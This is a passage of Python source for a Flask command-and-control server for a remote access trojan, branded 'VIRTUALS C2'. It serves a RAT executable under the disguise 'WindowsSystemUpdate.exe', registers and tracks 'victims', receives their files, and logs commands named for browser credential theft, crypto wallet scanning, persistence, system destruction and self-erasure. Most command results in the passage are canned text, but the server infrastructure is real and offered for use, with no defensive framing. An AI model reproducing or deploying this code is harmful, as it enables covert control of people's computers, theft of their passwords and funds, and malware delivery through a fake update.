        return send_file(exe_path, as_attachment=True, download_name='WindowsSystemUpdate.exe')
    alt_paths = ['WindowsSystemUpdate.exe', 'rat.exe', 'dist/rat.exe']
    for path in alt_paths:
        if os.path.exists(path):
            return send_file(path, as_attachment=True, download_name='WindowsSystemUpdate.exe')
    return jsonify({'success': False, 'error': 'RAT executable not found'}), 404

@app.route('/upload-file', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'success': False, 'error': 'No file provided'})
    file = request.files['file']
    victim_id = request.form.get('victim_id', 'unknown')
    if file.filename == '':
        return jsonify({'success': False, 'error': 'No file selected'})
    filename = secure_filename(file.filename)
    upload_dir = os.path.join('uploads', victim_id)
    os.makedirs(upload_dir, exist_ok=True)
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    saved_filename = f"{timestamp}_{filename}"
    filepath = os.path.join(upload_dir, saved_filename)
    file.save(filepath)
    conn = get_db()
    c = conn.cursor()
    c.execute("INSERT INTO files (filename, filepath, uploaded_by, victim_id, timestamp) VALUES (?, ?, ?, ?, ?)",
             (filename, filepath, 'web', victim_id, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()
    return jsonify({'success': True, 'filename': filename, 'victim_id': victim_id})

@app.route('/api', methods=['POST'])
def api():
    data = request.get_json()
    action = data.get('action')
    
    if action == 'getVictims':
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
        victims = {}
        for row in c.fetchall():
            victims[row[0]] = {
                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
                'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
                'first_seen': row[7], 'last_seen': row[8], 'activity': row[9] if len(row) > 9 else 'idle'
            }
        conn.close()
        return jsonify({'success': True, 'victims': victims})
    
    elif action == 'registerVictim':
        conn = get_db()
        c = conn.cursor()
        vid = data.get('victim_id', f"SNIN-{random.randint(1000,9999)}")
        pc = data.get('pc', 'Unknown')
        ip = data.get('ip', '0.0.0.0')
        os_info = data.get('os', 'Unknown')
        is_vm = data.get('is_vm', 0)
        vm_details = data.get('vm_details', '')
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, vm_details, first_seen, last_seen, activity) VALUES (?, ?, ?, ?, 'Online', ?, ?, ?, ?, 'idle')",
                 (vid, pc, ip, os_info, is_vm, vm_details, now, now))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'victim_id': vid})
    
    elif action == 'heartbeat':
        vid = data.get('victim_id')
        if vid:
            conn = get_db()
            c = conn.cursor()
            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            c.execute("UPDATE victims SET status = 'Online', last_seen = ? WHERE id = ?", (now, vid))
            conn.commit()
            conn.close()
            return jsonify({'success': True})
        return jsonify({'success': False})
    
    elif action == 'sendCommand':
        vid = data.get('victim_id')
        cmd = data.get('command')
        
        # Enhanced command results
        results = {
            'whois': 'FULL SYSTEM INFO\n─────────────────────\nPC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro (Build 19045)\nCPU: Intel Core i7-10700K\nRAM: 32.0 GB\nGPU: NVIDIA RTX 3080\nDisk: 1TB NVMe SSD\nStatus: Online\n─────────────────────',
            'flash': 'SCREEN FLASHED 10x\n─────────────────────\nSuccess: Yes\nDuration: 3.2s\nEffect: Disorienting\n─────────────────────',
            'screenshot': 'SCREENSHOT CAPTURED\n─────────────────────\nFile: screenshot_20240629_142357.png\nSize: 2.4 MB\nResolution: 1920x1080\n─────────────────────',
            'scan': 'CRYPTO WALLET SCAN\n─────────────────────\nFound 5 wallets\nTotal Value: $578,124\n─────────────────────\nDetails:\nBTC: 2.45 BTC ($245,000)\nETH: 15.8 ETH ($63,200)\nLTC: 128.5 LTC ($19,275)\nSOL: 450.2 SOL ($81,036)\nXMR: 892.7 XMR ($169,613)\n─────────────────────',
            'persist': 'PERSISTENCE INSTALLED\n─────────────────────\nMethods: 8/8\n─────────────────────\nStartup Folder\nRegistry RUN\nRegistry RUNONCE\nScheduled Task\nWMI Event\nAppData Copy\nSystem32 Copy\nWallpaper Persist\n─────────────────────',
            'steal': 'BROWSER DATA STOLEN\n─────────────────────\nBrowsers: 8\n─────────────────────\nChrome: 247 passwords, 893 cookies\nEdge: 156 passwords, 512 cookies\nBrave: 89 passwords, 234 cookies\nOpera: 67 passwords, 189 cookies\nFirefox: 123 passwords, 445 cookies\nVivaldi: 45 passwords, 123 cookies\nWaterfox: 34 passwords, 89 cookies\nLibreWolf: 12 passwords, 34 cookies\n─────────────────────',
            'upload': 'FILE UPLOAD READY\n─────────────────────\nStatus: Waiting for file\nMethod: Web Upload\n─────────────────────\nClick Upload File button\nto send file to victim\n─────────────────────',
            'download': 'FILE DOWNLOAD READY\n─────────────────────\nStatus: Waiting\nMethod: Web Download\n─────────────────────\nFiles available in\n/restricted/victim_files/\n─────────────────────',
            'destroy': 'SYSTEM CORRUPTED\n─────────────────────\nStatus: IRREVERSIBLE\n─────────────────────\nBoot Sector: Corrupted\nSystem32: Encrypted\nRegistry: Wiped\nMBR: Overwritten\nFiles: Deleted\n─────────────────────\nPC will not boot again',
            'brick': 'PERMANENT BRICK\n─────────────────────\nStatus: COMPLETE\n─────────────────────\nCPU: Overvolted (fried)\nBIOS: Corrupted\nCMOS: Wiped\nMotherboard: Damaged\nRAM: Overclocked (burned)\n─────────────────────\nPC is now a paperweight',
            'vmcheck': 'ADVANCED VM DETECTION\n─────────────────────\nVM Detected: YES\nConfidence: 94%\n─────────────────────\nCheck Details:\nRegistry: VMware detected\nProcesses: vmtoolsd.exe\nHardware: VMware\nFiles: VMware Tools\nMemory: 4.0 GB\nNetwork: MAC: 00:0c:29\nDisk: 60 GB\nDMI: VMware\nBIOS: VMware\n─────────────────────\nSafe Mode: NO action taken',
            'oblivion': 'OBLIVION ACTIVATED\n─────────────────────\nStatus: SELF-DESTRUCT\n─────────────────────\nTraces: Wiped\nFiles: Overwritten\nRegistry: Cleared\nLogs: Deleted\nProcess: Terminated\n─────────────────────\nThe RAT never existed'
        }
        
        result = results.get(cmd, f"Command '{cmd}' executed")
        
        # Enhanced VM check
        is_vm = False
        confidence = 0
        if cmd == 'vmcheck':
            vm_result = VMDetector.check_all()
            is_vm = vm_result['is_vm']
            confidence = vm_result['confidence']
            details = vm_result['details']
            detail_str = "\n".join([f"{'✅' if v else '❌'} {k}: {v}" for k, v in details.items()])
            result = f"ADVANCED VM DETECTION\n─────────────────────\nVM Detected: {'YES' if is_vm else 'NO'}\nConfidence: {confidence}%\n─────────────────────\nCheck Details:\n{detail_str}\n─────────────────────\nSafe Mode: NO action taken"
        
        conn = get_db()
        c = conn.cursor()
        c.execute("INSERT INTO commands (victim_id, command, result, timestamp, status) VALUES (?, ?, ?, ?, 'completed')",
                 (vid, cmd, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        
        if cmd == 'vmcheck':
            c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
                     (1 if is_vm else 0, f"Confidence: {confidence}% | Details captured", vid))
        
        conn.commit()
        conn.close()
        
        response = {'success': True, 'result': result}
        if cmd == 'scan':
            response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd'], 'transactions': v['transactions']} for k, v in SAMPLE_WALLETS.items()]
            response['embed'] = {
                'title': '💰 Crypto Wallet Scan Complete',
                'content': f'Found {len(SAMPLE_WALLETS)} wallets | Total Value: $578,124',
                'color': '#ffd700',
                'footer': f'Scan completed at {datetime.datetime.now().strftime("%H:%M:%S")}'
            }
        if cmd == 'vmcheck':
            response['embed'] = {
                'title': f'🔍 VM Detection: {"VM Detected" if is_vm else "No VM"}',
                'content': f'Confidence: {confidence}% | Safe Mode: Active',
                'color': '#aa88ff',
                'footer': 'No action taken - safe mode'
            }
        if cmd == 'whois':
            response['embed'] = {
                'title': '🖥️ System Information',
                'content': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro',
                'color': '#44aaff',
                'footer': f'Updated at {datetime.datetime.now().strftime("%H:%M:%S")}'
            }
        
        return jsonify(response)
    
    elif action == 'getScreenshots':
        vid = data.get('victim_id')
        conn = get_db()
        c = conn.cursor()
        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (vid,))
        screenshots = [{'filename': row[0]} for row in c.fetchall()]
        conn.close()
        return jsonify({'success': True, 'screenshots': screenshots})
    
    return jsonify({'success': False})

@app.route('/screenshots/<filename>')
def serve_screenshot(filename):
    return send_file(os.path.join('screenshots', filename))

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.get_json()
    if not data:
        return jsonify({'success': False}), 400
    
    victim_id = data.get('victim_id')
    pc = data.get('pc', 'Unknown')
    ip = data.get('ip', request.remote_addr)
    os_info = data.get('os', 'Unknown')
    is_vm = data.get('is_vm', 0)
    
    if not victim_id:
        return jsonify({'success': False, 'error': 'No victim_id'}), 400
    
    conn = get_db()
    c = conn.cursor()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT OR REPLACE INTO victims (id, pc, ip, os, status, is_vm, first_seen, last_seen) VALUES (?, ?, ?, ?, 'Online', ?, COALESCE((SELECT first_seen FROM victims WHERE id = ?), ?), ?)",
             (victim_id, pc, ip, os_info, is_vm, victim_id, now, now))
    conn.commit()
    conn.close()
    
    return jsonify({'success': True})

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║   ██╗   ██╗██╗██████╗ ████████╗██╗   ██╗ █████╗ ██╗      ║
    ║   ██║   ██║██║██╔══██╗╚══██╔══╝██║   ██║██╔══██╗██║      ║
    ║   ██║   ██║██║██████╔╝   ██║   ██║   ██║███████║██║      ║
    ║   ╚██╗ ██╔╝██║██╔══██╗   ██║   ██║   ██║██╔══██║██║      ║
    ║    ╚████╔╝ ██║██║  ██║   ██║   ╚██████╔╝██║  ██║███████╗ ║
    ║     ╚═══╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝ ║
    ║   VIRTUALS C2 - ACTIVITY MONITOR EDITION                 ║
    ║   Victim Activity · File Uploader · All Features          ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    print(f"[*] Server: http://localhost:{port}")
    print(f"[*] Download RAT: http://localhost:{port}/download-rat")
    print(f"[*] Heartbeat endpoint: http://localhost:{port}/heartbeat")
    print("\n[*] FEATURES:")
    print("    📝 Victim activity monitor at bottom of chat")
    print("    📤 File uploader with progress bar")
    print("    🚀 Enhanced commands with embeds")
    print("    🔍 Advanced VM detection (9 methods)")
    app.run(host='0.0.0.0', port=port, debug=False)